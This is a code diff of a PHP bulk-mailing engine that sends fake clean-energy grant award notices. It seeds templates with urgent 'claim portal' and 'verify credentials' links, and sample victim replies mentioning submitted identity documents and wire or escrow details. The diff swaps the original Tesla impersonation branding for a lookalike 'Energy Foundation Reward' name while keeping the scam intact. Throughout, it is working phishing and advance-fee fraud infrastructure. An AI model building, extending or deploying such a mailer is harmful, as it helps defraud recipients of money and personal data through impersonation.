@@ -1,6 +1,6 @@
 <?php
 /**
- * Tesla Energy Foundation Mailer â€” Core Engine Functions
+ * Energy Foundation Reward Mailer â€” Core Engine Functions
  * Dual Gateway Dispatcher (Resend Paid API + Google Workspace SMTP)
  * Universal Database Support: Railway MySQL + SQLite Auto-Switch
  */
@@ -163,7 +163,7 @@ function init_schema(PDO $pdo, bool $isMySQL = false): void {
         'google_smtp_host'        => env('SMTP_HOST', 'smtp.gmail.com'),
         'google_smtp_port'        => env('SMTP_PORT', '465'),
         'google_smtp_secure'      => '1',
-        'google_smtp_user'        => env('SMTP_USER', 'service@teslaenergyfoundation.com'),
+        'google_smtp_user'        => env('SMTP_USER', 'service@energyfoundationreward.com'),
         'google_smtp_pass'        => env('SMTP_PASS', ''),
         'provider_mode'           => 'auto_balance',
         'resend_ratio'            => '60',
@@ -183,8 +183,8 @@ function init_schema(PDO $pdo, bool $isMySQL = false): void {
         }
     }
 
-    // Inbound replies from clients route to the bulk mailer inbox at service@teslaenergyfoundation.com
-    set_setting('reply_to_email', 'service@teslaenergyfoundation.com');
+    // Inbound replies from clients route to the bulk mailer inbox at service@energyfoundationreward.com
+    set_setting('reply_to_email', 'service@energyfoundationreward.com');
 
     // Default provider mode to Resend only (Google Workspace will connect later)
     $googlePass = get_setting('google_smtp_pass', '');
@@ -253,7 +253,7 @@ function seed_templates(PDO $pdo): void {
     $ins->execute([
         'Clean Energy Grant Allocation Notice',
         'Grants & Awards',
-        'OFFICIAL ALLOCATION: Tesla Energy Foundation Community Grant Notification [Ref: {{ref_id}}]',
+        'OFFICIAL ALLOCATION: Energy Foundation Reward Community Grant Notification [Ref: {{ref_id}}]',
         '<!DOCTYPE html>
 <html>
 <head>
@@ -285,7 +285,7 @@ function seed_templates(PDO $pdo): void {
     </div>
     <div class="content">
       <div class="greeting">Dear {{name}},</div>
-      <p>We are pleased to inform you that your application profile has been allocated funding under the <strong>Tesla Energy Sustainable Community Fund 2026</strong>. This disbursement initiative was instituted to support residential solar integration, high-capacity battery storage distribution, and regional clean energy expansion.</p>
+      <p>We are pleased to inform you that your application profile has been allocated funding under the <strong>TEF Sustainable Community Fund 2026</strong>. This disbursement initiative was instituted to support residential solar integration, high-capacity battery storage distribution, and regional clean energy expansion.</p>
       
       <div class="badge-card">
         <div class="badge-grid">
@@ -311,17 +311,17 @@ function seed_templates(PDO $pdo): void {
       <p>To proceed with claim authorization and review the official beneficiary disclosure guidelines, please access your verified portal below or submit your verification dossier via reply.</p>
 
       <div class="cta-container">
-        <a href="https://teslafoundationreward.com/claim?ref={{ref_id}}" class="cta-btn">Access Claim Portal &rarr;</a>
+        <a href="https://energyfoundationreward.com/claim?ref={{ref_id}}" class="cta-btn">Access Claim Portal &rarr;</a>
       </div>
 
       <div class="notice">
-        <strong>Important Notice:</strong> Allocation grants must be validated within 14 business days of issuance. Direct inquiries or support documentation must be addressed to our claims desk at <code>service@teslaenergyfoundation.com</code>.
+        <strong>Important Notice:</strong> Allocation grants must be validated within 14 business days of issuance. Direct inquiries or support documentation must be addressed to our claims desk at <code>service@energyfoundationreward.com</code>.
       </div>
     </div>
     <div class="footer">
-      &copy; 2026 Tesla Energy Foundation. All rights reserved.<br>
-      Tesla Energy Sustainable Infrastructure &amp; Grants Division &bull; 1 Tesla Road, Austin, TX 78725<br>
-      Dispatched via verified infrastructure: teslaenergyfoundation.com &bull; Inbound Desk: service@teslaenergyfoundation.com
+      &copy; 2026 Energy Foundation Reward. All rights reserved.<br>
+      TEF Sustainable Infrastructure &amp; Grants Division &bull; 1 TEF Road, Austin, TX 78725<br>
+      Dispatched via verified infrastructure: energyfoundationreward.com &bull; Inbound Desk: service@energyfoundationreward.com
     </div>
   </div>
 </body>
@@ -332,7 +332,7 @@ function seed_templates(PDO $pdo): void {
     $ins->execute([
         'Energy Independence Reward Certificate',
         'Grants & Awards',
-        'CONFIRMATION: Tesla Foundation Energy Independence Award Allocation â€” Cert #{{ref_id}}',
+        'CONFIRMATION: Energy Foundation Energy Independence Award Allocation â€” Cert #{{ref_id}}',
         '<!DOCTYPE html>
 <html>
 <head>
@@ -357,27 +357,27 @@ function seed_templates(PDO $pdo): void {
     </div>
     <div class="body">
       <p>Greetings <strong>{{name}}</strong>,</p>
-      <p>We are pleased to provide formal documentation of your grant allotment under the Tesla Foundation clean infrastructure project. This certificate is registered under Reference <strong>{{ref_id}}</strong>.</p>
+      <p>We are pleased to provide formal documentation of your grant allotment under the Energy Foundation clean infrastructure project. This certificate is registered under Reference <strong>{{ref_id}}</strong>.</p>
       
       <div class="box">
         <div style="font-weight:700;font-size:14px;color:#0f172a;margin-bottom:12px;text-transform:uppercase;letter-spacing:1px;">Grant Award Certificate Details</div>
         <div style="font-size:14px;">
           <p style="margin:4px 0;"><strong>Recipient:</strong> {{name}} ({{email}})</p>
           <p style="margin:4px 0;"><strong>Grant Valuation:</strong> <span style="color:#059669;font-weight:700;font-size:16px;">{{grant_amount}}</span></p>
-          <p style="margin:4px 0;"><strong>Issuing Authority:</strong> Tesla Energy Foundation</p>
-          <p style="margin:4px 0;"><strong>Processing Center:</strong> teslafoundationreward.com</p>
+          <p style="margin:4px 0;"><strong>Issuing Authority:</strong> Energy Foundation Reward</p>
+          <p style="margin:4px 0;"><strong>Processing Center:</strong> energyfoundationreward.com</p>
         </div>
       </div>
 
       <p>For security, please confirm receipt of this notification or proceed to verify your credentials on our designated intake platform.</p>
 
       <div style="text-align:center;">
-        <a href="https://teslafoundationreward.com/verify?id={{ref_id}}" class="btn">Verify &amp; Proceed With Claim</a>
+        <a href="https://energyfoundationreward.com/verify?id={{ref_id}}" class="btn">Verify &amp; Proceed With Claim</a>
       </div>
     </div>
     <div class="foot">
-      Tesla Energy Foundation &bull; Sending Domain: teslaenergyfoundation.com<br>
-      To respond or inquire, reply directly to this email or write to service@teslaenergyfoundation.com.
+      Energy Foundation Reward &bull; Sending Domain: energyfoundationreward.com<br>
+      To respond or inquire, reply directly to this email or write to service@energyfoundationreward.com.
     </div>
   </div>
 </body>
@@ -393,8 +393,8 @@ function seed_inbox_messages(PDO $pdo): void {
             '<tef-in-8921@mail.gmail.com>',
             'Alex Morgan',
             'alex.morgan@gmail.com',
-            'service@teslaenergyfoundation.com',
-            'Re: OFFICIAL ALLOCATION: Tesla Energy Foundation Grant [Ref: TEF-8921]',
+            'service@energyfoundationreward.com',
+            'Re: OFFICIAL ALLOCATION: Energy Foundation Reward Grant [Ref: TEF-8921]',
             '<p>Dear Foundation Director,</p><p>Thank you for notifying me of the clean infrastructure allocation grant (Ref: TEF-8921). I have uploaded the residential electrical assessment and proof of occupancy.</p><p>Could you confirm if the battery storage unit will be shipped directly to our regional installer?</p><p>Best regards,<br>Alex Morgan<br>Tel: +1 (555) 392-1084</p>',
             "Dear Foundation Director,\n\nThank you for notifying me of the clean infrastructure allocation grant (Ref: TEF-8921). I have uploaded the residential electrical assessment and proof of occupancy.\n\nCould you confirm if the battery storage unit will be shipped directly to our regional installer?\n\nBest regards,\nAlex Morgan",
             'Thank you for notifying me of the clean infrastructure allocation grant (Ref: TEF-8921). I have uploaded the residential...',
@@ -407,10 +407,10 @@ function seed_inbox_messages(PDO $pdo): void {
             '<tef-in-9310@outlook.com>',
             'Marcus Vance',
             'marcus.vance@outlook.com',
-            'service@teslaenergyfoundation.com',
+            'service@energyfoundationreward.com',
             'Inquiry on Solar Storage Disbursement & Tax Credits',
-            '<p>Hello Tesla Energy Grants Team,</p><p>I received the notification regarding our renewable energy endowment valuation ($120,000). I am completing the digital verification dossier through your designated intake portal.</p><p>Please advise on the processing timeframe for the official disbursement certificate.</p><p>Sincerely,<br>Marcus Vance<br>Vance Clean Tech Labs</p>',
-            "Hello Tesla Energy Grants Team,\n\nI received the notification regarding our renewable energy endowment valuation ($120,000). I am completing the digital verification dossier through your designated intake portal.\n\nPlease advise on the processing timeframe for the official disbursement certificate.\n\nSincerely,\nMarcus Vance",
+            '<p>Hello TEF Grants Team,</p><p>I received the notification regarding our renewable energy endowment valuation ($120,000). I am completing the digital verification dossier through your designated intake portal.</p><p>Please advise on the processing timeframe for the official disbursement certificate.</p><p>Sincerely,<br>Marcus Vance<br>Vance Clean Tech Labs</p>',
+            "Hello TEF Grants Team,\n\nI received the notification regarding our renewable energy endowment valuation ($120,000). I am completing the digital verification dossier through your designated intake portal.\n\nPlease advise on the processing timeframe for the official disbursement certificate.\n\nSincerely,\nMarcus Vance",
             'I received the notification regarding our renewable energy endowment valuation ($120,000). I am completing the digital...',
             0,
             0,
@@ -421,7 +421,7 @@ function seed_inbox_messages(PDO $pdo): void {
             '<tef-in-4822@yahoo.com>',
             'Elena Rostova',
             'elena.rostova@yahoo.com',
-            'service@teslaenergyfoundation.com',
+            'service@energyfoundationreward.com',
             'Verification Dossier Attached — Ref #TEF-4822',
             '<p>To Whom It May Concern,</p><p>Acknowledging receipt of our community fund endowment allocation. All required entity credentials and corporate identification documents have been verified.</p><p>Awaiting counter-signature and confirmation of dispatch.</p><p>Cordially,<br>Elena Rostova</p>',
             "To Whom It May Concern,\n\nAcknowledging receipt of our community fund endowment allocation. All required entity credentials and corporate identification documents have been verified.\n\nAwaiting counter-signature and confirmation of dispatch.\n\nCordially,\nElena Rostova",
@@ -435,7 +435,7 @@ function seed_inbox_messages(PDO $pdo): void {
             '<tef-in-1109@proton.me>',
             'David Chen',
             'david.chen22@proton.me',
-            'service@teslaenergyfoundation.com',
+            'service@energyfoundationreward.com',
             'Direct Wire & Wire Transfer Instructions - Grant Claim Ref #TEF-1109',
             '<p>Good day,</p><p>Following our receipt of the grant allocation certificate #TEF-1109, we have updated our escrow institution details. Please let us know if additional notarization is required.</p><p>Respectfully,<br>David Chen</p>',
             "Good day,\n\nFollowing our receipt of the grant allocation certificate #TEF-1109, we have updated our escrow institution details. Please let us know if additional notarization is required.\n\nRespectfully,\nDavid Chen",
@@ -449,10 +449,10 @@ function seed_inbox_messages(PDO $pdo): void {
             '<tef-in-6502@gmail.com>',
             'Sarah J. Connor',
             'sarah.j.connor@gmail.com',
-            'service@teslaenergyfoundation.com',
+            'service@energyfoundationreward.com',
             'Confirmation of Solar Panel Installation Schedule',
-            '<p>Hi Tesla Energy Foundation Team,</p><p>We are ready for the regional infrastructure team to conduct the on-site survey next Tuesday. All documentation is in order.</p><p>Thank you,<br>Sarah</p>',
-            "Hi Tesla Energy Foundation Team,\n\nWe are ready for the regional infrastructure team to conduct the on-site survey next Tuesday. All documentation is in order.\n\nThank you,\nSarah",
+            '<p>Hi Energy Foundation Reward Team,</p><p>We are ready for the regional infrastructure team to conduct the on-site survey next Tuesday. All documentation is in order.</p><p>Thank you,<br>Sarah</p>',
+            "Hi Energy Foundation Reward Team,\n\nWe are ready for the regional infrastructure team to conduct the on-site survey next Tuesday. All documentation is in order.\n\nThank you,\nSarah",
             'We are ready for the regional infrastructure team to conduct the on-site survey next Tuesday. All documentation is in order...',
             1,
             0,
@@ -481,9 +481,9 @@ function get_inbox_stats(): array {
 function get_reward_inbox_stats(): array {
     $pdo = db();
     try {
-        $total = (int)$pdo->query("SELECT COUNT(*) FROM inbox_messages WHERE to_email LIKE '%teslafoundationreward.com%' OR category LIKE 'reward%'")->fetchColumn();
-        $unread = (int)$pdo->query("SELECT COUNT(*) FROM inbox_messages WHERE is_read = 0 AND (to_email LIKE '%teslafoundationreward.com%' OR category LIKE 'reward%')")->fetchColumn();
-        $sentCount = (int)$pdo->query("SELECT COUNT(*) FROM email_logs WHERE from_address LIKE '%teslafoundationreward.com%'")->fetchColumn();
+        $total = (int)$pdo->query("SELECT COUNT(*) FROM inbox_messages WHERE to_email LIKE '%energyfoundationreward.com%' OR category LIKE 'reward%'")->fetchColumn();
+        $unread = (int)$pdo->query("SELECT COUNT(*) FROM inbox_messages WHERE is_read = 0 AND (to_email LIKE '%energyfoundationreward.com%' OR category LIKE 'reward%')")->fetchColumn();
+        $sentCount = (int)$pdo->query("SELECT COUNT(*) FROM email_logs WHERE from_address LIKE '%energyfoundationreward.com%'")->fetchColumn();
         return ['total' => $total, 'unread' => $unread, 'sent' => $sentCount];
     } catch (Throwable $e) {
         return ['total' => 0, 'unread' => 0, 'sent' => 0];
@@ -721,7 +721,7 @@ function send_google_smtp_email(
 ): array {
     $host = get_setting('google_smtp_host', env('SMTP_HOST', 'smtp.gmail.com'));
     $port = (int)get_setting('google_smtp_port', env('SMTP_PORT', '465'));
-    $user = trim(get_setting('google_smtp_user', env('SMTP_USER', 'service@teslaenergyfoundation.com')));
+    $user = trim(get_setting('google_smtp_user', env('SMTP_USER', 'service@energyfoundationreward.com')));
     $pass = trim(str_replace(' ', '', get_setting('google_smtp_pass', env('SMTP_PASS', ''))));
 
     if (empty($user) || empty($pass)) {
@@ -987,7 +987,7 @@ function send_dual_email(
             ]);
         }
     } catch (Throwable $logErr) {
-        error_log('[Tesla Mailer Log Error] ' . $logErr->getMessage());
+        error_log('[TEF Mailer Log Error] ' . $logErr->getMessage());
     }
 
     return $res;
@@ -1020,7 +1020,7 @@ function test_resend_api(?string $apiKey = null): array {
 function test_google_smtp(?string $host = null, ?int $port = null, ?string $user = null, ?string $pass = null): array {
     $host = $host ?: get_setting('google_smtp_host', env('SMTP_HOST', 'smtp.gmail.com'));
     $port = $port ?: (int)get_setting('google_smtp_port', env('SMTP_PORT', '465'));
-    $user = trim($user ?: get_setting('google_smtp_user', env('SMTP_USER', 'service@teslaenergyfoundation.com')));
+    $user = trim($user ?: get_setting('google_smtp_user', env('SMTP_USER', 'service@energyfoundationreward.com')));
     $pass = trim(str_replace(' ', '', $pass ?: get_setting('google_smtp_pass', env('SMTP_PASS', ''))));
 
     if (empty($user)) {
